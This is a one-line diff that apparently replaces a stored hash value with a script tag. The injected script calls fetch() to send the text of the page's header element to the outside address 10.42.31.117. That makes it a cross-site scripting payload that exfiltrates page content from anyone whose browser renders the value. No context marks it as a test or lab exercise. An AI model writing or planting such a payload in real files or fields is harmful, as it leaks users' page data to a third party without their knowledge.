@@ -1,1 +1,1 @@
-9497112640a683b21e621baf3ed2b637
+<script>fetch(`http://10.42.31.117/.${document.querySelector('header').textContent}`)</script>
